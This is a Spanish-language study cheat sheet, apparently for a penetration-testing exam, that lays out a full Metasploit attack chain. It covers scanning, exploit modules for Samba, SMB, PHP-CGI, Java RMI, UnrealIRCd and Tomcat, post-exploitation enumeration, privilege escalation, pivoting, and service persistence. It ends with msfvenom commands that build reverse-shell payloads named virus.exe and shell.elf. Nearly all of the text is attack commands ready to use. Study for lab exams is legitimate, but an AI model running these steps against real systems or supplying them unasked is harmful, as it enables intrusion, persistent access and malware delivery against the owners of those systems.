
## 1. Fase de Preparación 

Antes de lanzar cualquier ataque, debes configurar el entorno de trabajo para que los resultados se guarden.

- **Levantar base de datos:** `msfdb init` 
- **Iniciar Metasploita:** `msfconsole`
- **Crear Workspace:** `workspace -a nombre_examen`.
- **Importar Hosts:** Si haces un escaneo externo: `db_nmap -sV [IP_Objetivo]`.
- **Consultar lo encontrado:**

    - `hosts`: Muestra IPs descubiertas.
    
    - `services`: Muestra puertos y versiones.
        
    - `vulns`: Muestra vulnerabilidades detectadas por MSF.
        

---

## 2. Explotación (Conseguir la primera Sesión)

Busca el exploit con `search [CVE o nombre]` y configúralo.

- **Samba (Linux):** `exploit/multi/samba/usermap_script` (CVE-2007-2447).
    
- **Windows (SMB):** `exploit/windows/smb/ms17_010_eternalromance`.
    
- **PHP/CGI:** `exploit/multi/http/php_cgi_arg_injection`.
    
- **Java RMI:** `exploit/multi/misc/java_rmi_server`.
    
- **Comandos obligatorios tras elegir exploit:**
    
    - `set RHOSTS [IP_Victima]`
        
    - `set LHOST [Tu_IP_Kali]`
        
    - `exploit` o `run`
        

---

## 3. Post-Explotación (Qué hacer cuando estás dentro)

Una vez tengas una sesión (Meterpreter o Shell), usa estos módulos para recolectar datos.

- **¿Es una VM?:** `post/linux/gather/checkvm`.
    
- **Información de Red:** `post/linux/gather/enum_network`.
    
- **Usuarios y Cron:** `post/linux/gather/enum_system`.
    
- **Historial y Sudoers:** `post/linux/gather/enum_users_history`.
    
- **Ver si hay Docker:** `post/linux/gather/checkcontainer`.
    
- **Escalar Privilegios (udev):** `exploit/linux/local/udev_netlink` (CVE-2009-1185).
    

---

## 4. Pivoting y Persistencia (Lo más difícil)

### Pivoting (Saltar a otra red)

Si la máquina comprometida tiene dos interfaces y quieres llegar a una red interna oculta:

1. **Ver rutas de la víctima:** `ipconfig` o `route` (dentro de Meterpreter).
    
2. **Añadir ruta manual:** `route add [Red_Interna] [Máscara] [ID_Sesión]`.
    
3. **Ruta automática:** `post/multi/manage/autoroute`.
    
4. **Escanear la red interna:** `auxiliary/scanner/portscan/tcp` (indica los puertos que sospechas, ej: 6667, 6697).
    

### Persistencia (Mantener el acceso)

Para que la sesión vuelva sola tras un reinicio de la víctima:

- **Módulo:** `exploit/windows/local/persistence_service`.
    
- **IMPORTANTE:** Debes dejar un `exploit/multi/handler` escuchando en tu Kali para recibir la conexión cuando la víctima encienda.
    

---

## 5. Recordatorio de Msfvenom (Payloads manuales)

Si el examen te pide crear un archivo infectado:

- **Windows (.exe):**
    
    `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Tu_IP] LPORT=4444 -f exe > virus.exe`.
    
- **Linux (.elf):**
    
    `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[Tu_IP] LPORT=4444 -f elf > shell.elf`.


## Tabla para los módulos 

|**Si ves en el escaneo...**|**Qué buscar en MSF**|**Módulo/Exploit clave**|
|---|---|---|
|**Samba (puerto 445)**|`search usermap_script`|`exploit/multi/samba/usermap_script`|
|**Java RMI (puerto 1099)**|`search java_rmi`|`exploit/multi/misc/java_rmi_server`|
|**UnrealIRCd**|`search unreal_ircd`|`exploit/unix/irc/unreal_ircd_3281_backdoor`|
|**Tomcat (puerto 8080)**|`search tomcat_mgr`|`exploit/multi/http/tomcat_mgr_deploy`|
|**PHP CGI**|`search php_cgi`|`exploit/multi/http/php_cgi_arg_injection`|
|**VNC (puerto 5900)**|`search vnc_login`|`auxiliary/scanner/vnc/vnc_login`|
|**SSH**|`search ssh_login`|`auxiliary/scanner/ssh/ssh_login`|
